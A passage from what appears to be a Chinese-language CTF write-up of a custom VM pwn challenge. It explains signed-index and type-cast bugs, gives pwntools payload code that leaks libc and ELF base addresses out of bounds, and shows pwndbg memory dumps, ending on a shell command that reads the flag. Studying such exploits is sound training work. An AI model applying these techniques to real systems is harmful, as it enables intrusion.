...\n&#x27;</span>)</span><br><span class="line">       p.recvline()</span><br><span class="line">       p.recvuntil(<span class="string">&#x27;down ...\n&#x27;</span>)</span><br><span class="line">       p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">       res = p.recvline()</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, res)</span><br><span class="line">       p.interactive()</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       p.close()</span><br><span class="line">       <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>逻辑简述：</p>
<ul>
<li>程序把输入进来的 “0x100字节的code” 分为 “每4字节一小份”</li>
<li>每份又分为4个部分：key ~ p1 ~ p2 ~ p3 ，key用来定位需要执行的“指令”（which-case中的条目），p1 p2 p3 就是对应的偏移（用于获取v10中的数据）</li>
<li>另外程序中还有 v10（被操作的主体），v12（被打印的主体）</li>
</ul>
<p>漏洞分析：</p>
<ul>
<li>v10被强转为了(_WORD *)类型（2字节），本身为int64（8字节），p1过大很容易时溢出</li>
<li>mul指令没有对p2进行检查，可以把很大的数字（比如地址）写入*(&amp;v10+p1)</li>
<li>mv指令没有对p2进行检查，可以利用较大的数字，使“SBYTEn”被识别为负数</li>
<li>push指令将不断进行“++v9”这个操作，“v12”内部的数据可以溢出</li>
</ul>
<p>先照抄官方的函数定义，并尝试进行泄露：（这里我打算模仿我们组里某个大佬的操作）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pay = push()*<span class="number">8</span></span><br><span class="line">pay +=sh()+push()+sh()+push()+sh()</span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] MVA is starting ...\n&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">libc.address = d - <span class="number">0x223700</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<p>通过“push”使“v9”持续增加，最后打印“v12[v9]”中的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x55e14e4377fc</span>    mov    rax, qword ptr [rbp - <span class="number">0x230</span>] <span class="comment">/* rax=v9 */</span></span><br><span class="line">  <span class="number">0x55e14e437803</span>    add    rax, <span class="number">1</span> <span class="comment">/* rax=rax+1 */</span></span><br><span class="line">  <span class="number">0x55e14e437807</span>    mov    qword ptr [rbp - <span class="number">0x230</span>], rax <span class="comment">/* v9=rax */</span></span><br><span class="line">► <span class="number">0x55e14e43780e</span>    jmp    <span class="number">0x55e14e437a2b</span> <span class="comment">/* 返回循环开始 */</span>              </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fff54fd54a0</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[0-3] */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x2</span> <span class="comment">/* v9=2 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fff54fd54a0</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[0-3] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7fff54fd54a8</span> ◂— <span class="number">0x1</span> <span class="comment">/* v12[4-7] */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f518679a700</span> —▸ <span class="number">0x7f518679a190</span> —▸ <span class="number">0x55e14e436000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 8 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x8</span> <span class="comment">/* v9=8 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f518679a700</span> —▸ <span class="number">0x7f518679a190</span> —▸ <span class="number">0x55e14e436000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* v12[8-11](target) */</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0xa700</span> <span class="comment">/* v12[8] */</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 9 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">9</span> <span class="comment">/* v9=9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f5186790000</span> ◂— <span class="string">&#x27;s (%s%%)\n&#x27;</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x8679</span> <span class="comment">/* v12[9] */</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 10 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0xa</span> <span class="comment">/* v9=10 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> ◂— <span class="number">0x7f5100000000</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x7f51</span> <span class="comment">/* v12[10] */</span> </span><br></pre></td></tr></table></figure>
<p>libc_base 成功泄露，接下来看泄露 pro_base 的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pay = push() <span class="comment"># 没什么用,只是为了调试而已</span></span><br><span class="line">pay += ldr(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xf4</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">pay += sh() + push() + sh() + push() + sh()</span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] MVA is starting ...\n&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">elfbase = d - <span class="number">0x1a70</span></span><br><span class="line">log.success(<span class="string">&quot;elfbase: &quot;</span> + <span class="built_in">hex</span>(elfbase))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0x6aa66cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>4 个 ldr 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0xf46aa66cd4</span> <span class="comment">/* v10[0]:f4 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x80000000</span> <span class="comment">/* v10[3]:0x80000000 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x7ffcefc61170</span> <span class="comment">/* v10被强转为2byte(注意小端序) */</span></span><br><span class="line"><span class="number">0x7ffcefc61170</span>:	<span class="number">0x6aa66cd4</span>	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffcefc61180</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>4 个 mv 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x80000000000000f4</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0xf46aa66cd4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x80000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x7ffcefc61160</span> </span><br><span class="line"><span class="number">0x7ffcefc61160</span>:	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffcefc61170</span>:	<span class="number">0x6aa66cd4</span>	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000000</span></span><br><span class="line">    <span class="comment">/* v10[0] to v10[-10] */</span></span><br><span class="line">    <span class="comment">/* v10[3] to v10[-7] */</span></span><br></pre></td></tr></table></figure>
<p>发现v9出现异常，这里解释一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2)</span></span><br></pre></td></tr></table></figure>
<p>因为“SBYTEn”和“SBYTEn”是“int8”类型，所以“0xf6”被识别为“-9”，“0xf7”被识别为“-8”……</p>
<p>导致“v10[-10]”，“v10[-7]”分别被写入“v10[0]”，“v10[3]”，最终导致“v9”被覆盖</p>
<ul>
<li>v9 = 0x80000000000000f4</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0xaa70</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: <span class="number">0x80000000000000f4</span>*<span class="number">2</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">18446744073709552104</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="number">0x7ffcefc61180</span>+<span class="number">18446744073709552104</span></span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">18446884798040773480</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: hex(<span class="number">18446884798040773480</span>) <span class="comment">/* 直接舍弃溢出的部分 */</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="string">&#x27;0x100007ffcefc61368&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61368</span> <span class="comment">/* 发现目标数据 */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffcefc61368</span> ◂— <span class="number">0x56499559aa70</span> <span class="comment">/* v12[0x80000000000000f4] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffcefc61370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffcefc61378</span> —▸ <span class="number">0x56499559a100</span> ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffcefc61380</span> —▸ <span class="number">0x7ffcefc61480</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffcefc61388</span> ◂— <span class="number">0x39d2b6d7df852f00</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp <span class="number">0x7ffcefc61390</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 0x80000000000000f5</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x9559</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61368</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffcefc61368</span> ◂— <span class="number">0x5649955900f4</span> <span class="comment">/* v12[0x80000000000000f5] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffcefc61370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffcefc61378</span> —▸ <span class="number">0x56499559a100</span> ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffcefc61380</span> —▸ <span class="number">0x7ffcefc61480</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffcefc61388</span> ◂— <span class="number">0x39d2b6d7df852f00</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp <span class="number">0x7ffcefc61390</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 0x80000000000000f6</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x5649</span></span><br></pre></td></tr></table></figure>
